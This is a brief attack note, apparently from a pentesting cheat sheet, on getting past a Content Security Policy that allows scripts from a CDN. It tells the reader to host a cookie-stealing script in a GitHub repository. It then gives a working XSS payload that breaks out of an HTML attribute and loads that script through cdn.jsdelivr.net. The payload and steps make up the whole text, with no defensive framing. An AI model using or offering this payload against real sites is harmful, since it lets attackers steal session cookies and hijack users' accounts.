Script over CDN allowed in CSP:

1- Make a repository in github with a malicious file that fetch the session cookie
2- Run the payload pointing to the repository through CDN.JSDELIVR
"><script src='https://cdn.jsdelivr.net/gh/niiiick3/TestXSS/xss_tester.js'></script>
